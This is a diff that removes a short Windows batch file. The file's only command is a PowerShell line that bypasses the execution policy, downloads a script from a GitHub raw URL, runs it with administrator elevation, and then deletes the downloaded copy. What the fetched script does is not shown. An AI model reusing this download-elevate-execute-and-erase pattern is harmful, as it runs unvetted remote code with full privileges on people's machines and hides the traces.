@@ -1,2 +1,0 @@
-@echo off
-powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr 'https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/sqd5dcwh.ps1' -OutFile '%TEMP%\sqd5dcwh.ps1'; Start-Process 'powershell.exe' -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', '%TEMP%\sqd5dcwh.ps1' -Verb RunAs -Wait; Remove-Item '%TEMP%\sqd5dcwh.ps1' -Force"
